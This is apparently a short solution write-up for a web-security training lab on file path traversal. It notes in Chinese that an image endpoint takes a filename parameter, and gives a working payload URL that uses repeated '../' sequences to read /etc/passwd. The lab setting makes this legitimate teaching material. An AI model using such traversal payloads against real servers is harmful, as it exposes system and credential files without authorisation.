# Lab: File path traversal, simple case

This lab contains a file path traversal vulnerability in the display of product images.

To solve the lab, retrieve the contents of the /etc/passwd file.

## LFI
* 觀察一下可以看到有一個 api 是叫 filename 之後拿圖片
```
payload = https://ac271fc71eea2c12c05608c6005300c7.web-security-academy.net/image?filename=../../../../../../../../../etc/passwd
```